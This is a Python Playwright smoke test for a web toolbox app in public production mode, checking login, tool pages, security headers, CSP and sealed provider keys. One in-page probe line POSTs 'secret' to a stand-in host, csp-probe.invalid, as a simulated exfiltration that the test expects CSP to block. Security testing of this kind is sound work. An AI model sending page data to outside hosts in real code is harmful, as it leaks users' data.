#!/usr/bin/env python3
"""Production-mode smoke (the public deployment shape): `npm run build && npm run start` with KNIFE_AUTH_MODE=public.

Against a server YOU started from a build, with its own fresh KNIFE_DATA_DIR (never the live one):
  npm run build
  KNIFE_AUTH_MODE=public KNIFE_DATA_DIR=$(mktemp -d) KNIFE_PORT=<port> KNIFE_MAIL_TRANSPORT=outbox \
    KNIFE_TRUSTED_PROXIES=127.0.0.1,::1 KNIFE_PUBLIC_URL=http://127.0.0.1:<port> npm run start
  (serve.mjs refuses public mode without a trusted proxy and a public URL: scripts/deploy-config.mjs)
  node tests/mock_provider.mjs <mock-port>
  KNIFE_DATA_DIR=<same> python3 tests/prod_smoke.py http://127.0.0.1:<port> http://127.0.0.1:<mock-port>

Makes an admin with the private-network opt-out (CLI), signs in through the login page, opens the launcher and a spread
of tools (workers, WebAssembly, OCR assets, the office page), uses the assistant with the mock provider (one plain reply,
one tool call that types into a page), and fails on any console error, CSP violation or page error. Also checks that the
production server sends the security headers and no dev-only endpoints answer.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import urllib.error
import urllib.request
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
BASE = sys.argv[1].rstrip("/")
MOCK = sys.argv[2].rstrip("/")
DATA = os.environ.get("KNIFE_DATA_DIR", "")
PASSWORD = "prod smoke password 1"
TOOLS = ["/", "/tools/qr", "/tools/text", "/tools/json", "/tools/sql-lab", "/tools/pdf", "/tools/image-resize", "/tools/csv-profile", "/tools/regex", "/tools/markdown", "/tools/file-compressor", "/tools/cv-studio", "/tools/db-course", "/tools/office", "/tools/sidecars", "/account"]
FAILS: list[str] = []


def check(name: str, ok: bool, detail: object = "") -> None:
    print(f"{'PASS' if ok else 'FAIL'}  {name}{'' if ok else '  -> ' + str(detail)[:600]}", flush=True)
    if not ok:
        FAILS.append(name)


def head(path: str) -> tuple[int, dict[str, str]]:
    try:
        with urllib.request.urlopen(BASE + path, timeout=30) as resp:
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}
    except urllib.error.HTTPError as err:
        return err.code, {k.lower(): v for k, v in err.headers.items()}


def main() -> int:
    if not DATA or "/.local/share/samurai-knife" in DATA:
        sys.exit("set KNIFE_DATA_DIR to the scratch server's own data dir")
    if BASE.endswith(":3210"):
        sys.exit("refusing the live :3210 server")
    env = {**os.environ, "KNIFE_AUTH_MODE": "public"}
    run = lambda *a, stdin="": subprocess.run(["node", str(ROOT / "scripts" / "accounts.mjs"), *a], input=stdin, text=True, capture_output=True, env=env)  # noqa: E731
    r = run("add", "smoke", "--name", "Smoke", "--password-prompt", "--email", "smoke@example.com", "--role", "admin", stdin=f"{PASSWORD}\n")
    check("admin account via CLI", r.returncode == 0 or "already exists" in r.stderr, r.stderr)
    check("private-network opt-out via CLI", run("set-network", "smoke", "private").returncode == 0)

    status, headers = head("/login")
    check("login page 200", status == 200, status)
    csp = headers.get("content-security-policy", "")
    check("CSP + frame-ancestors on pages", "frame-ancestors 'self'" in csp and "connect-src 'self'" in csp, csp)
    check("no unsafe dev additions in production CSP", "ws:" not in csp, csp)
    check("no X-Powered-By", "x-powered-by" not in headers, headers)
    status, _ = head("/_next/webpack-hmr")
    check("no dev HMR endpoint", status in (400, 404), status)

    errors: list[str] = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        page = browser.new_page(viewport={"width": 1280, "height": 900})
        page.on("console", lambda m: errors.append(f"{page.url} console.{m.type}: {m.text}") if m.type == "error" else None)
        page.on("pageerror", lambda e: errors.append(f"{page.url} pageerror: {e}"))
        page.goto(BASE + "/login", wait_until="networkidle")
        page.locator("input[autocomplete=username]").fill("smoke")
        page.locator("input[autocomplete=current-password]").fill(PASSWORD)
        page.locator("form[aria-label='Log in'] button[type=submit]").click()
        page.wait_for_url(lambda url: "/login" not in url, timeout=30_000)
        check("signed in through the login page", "/login" not in page.url, page.url)

        # Provider through the API with the browser's own session (same origin, JSON).
        saved = page.evaluate("""async (mock) => {
          const r = await fetch('/api/account/provider', {method: 'PUT', headers: {'content-type': 'application/json'}, body: JSON.stringify({baseUrl: mock + '/v1', model: 'mock-model', apiKey: 'mock-key'})});
          return r.status;
        }""", MOCK)
        check("admin saves the loopback mock provider", saved == 200, saved)

        for path in TOOLS:
            page.goto(BASE + path, wait_until="networkidle")
            page.wait_for_function("!document.querySelector('main [role=status]') || !/Loading tool/.test(document.querySelector('main').innerText)", timeout=30_000)
            check(f"opens {path}", page.locator("main").count() == 1)

        # What the tools rely on is allowed by the CSP (sql.js/tesseract WASM, blob workers, ajv's new Function), and
        # posting page data to another origin is not.
        probes = page.evaluate("""async () => {
          const out = {};
          try { await WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])); out.wasm = true; } catch (e) { out.wasm = String(e); }
          try {
            const url = URL.createObjectURL(new Blob(["postMessage(41 + 1)"], { type: "text/javascript" }));
            out.worker = await new Promise((resolve) => { const w = new Worker(url); w.onmessage = (e) => resolve(e.data === 42); w.onerror = (e) => resolve(String(e.message)); setTimeout(() => resolve("timeout"), 5000); });
          } catch (e) { out.worker = String(e); }
          try { out.fn = new Function("return 7")() === 7; } catch (e) { out.fn = String(e); }
          try { await fetch("https://csp-probe.invalid/x", { method: "POST", body: "secret" }); out.exfil = "sent"; } catch (e) { out.exfil = "blocked"; }
          return out;
        }""")
        check("CSP allows WebAssembly, blob workers and new Function; blocks cross-origin fetch", probes == {"wasm": True, "worker": True, "fn": True, "exfil": "blocked"}, probes)

        page.goto(BASE + "/tools/text", wait_until="networkidle")
        page.locator("button[aria-label='Open assistant']").click()
        dialog = page.locator("[role=dialog][aria-label='Toolbox assistant']")
        dialog.wait_for()
        composer = page.locator("textarea[aria-label='Message the assistant']")
        composer.wait_for(timeout=30_000)
        composer.fill("hello production")
        composer.press("Enter")
        dialog.get_by_text("ECHO: hello production").first.wait_for(timeout=60_000)
        check("assistant answered through the mock provider", True)
        field = page.locator("main textarea").first
        composer.fill("CALL:page_snapshot:{}")
        composer.press("Enter")
        dialog.get_by_text("DONE:").first.wait_for(timeout=60_000)
        check("assistant tool round (page_snapshot) completed", True)
        check("text tool still present", field.count() == 1)
        browser.close()

    # Expected noise: the signed-out account check on /login answers 401; the deliberate cross-origin probe is refused.
    errors = [e for e in errors if not ("/login" in e and "401" in e) and "csp-probe" not in e]
    csp_errors = [e for e in errors if "Content Security Policy" in e or "Refused to" in e]
    check("no CSP violations", not csp_errors, csp_errors[:5])
    other = [e for e in errors if e not in csp_errors]
    check("no console/page errors", not other, other[:5])
    raw = (Path(DATA) / "accounts.json").read_text()
    check("provider key sealed on disk", "mock-key" not in raw and "enc:v1:" in raw)
    print(f"\n{len(FAILS)} failed" if FAILS else "\nALL PASS")
    return 1 if FAILS else 0


if __name__ == "__main__":
    sys.exit(main())
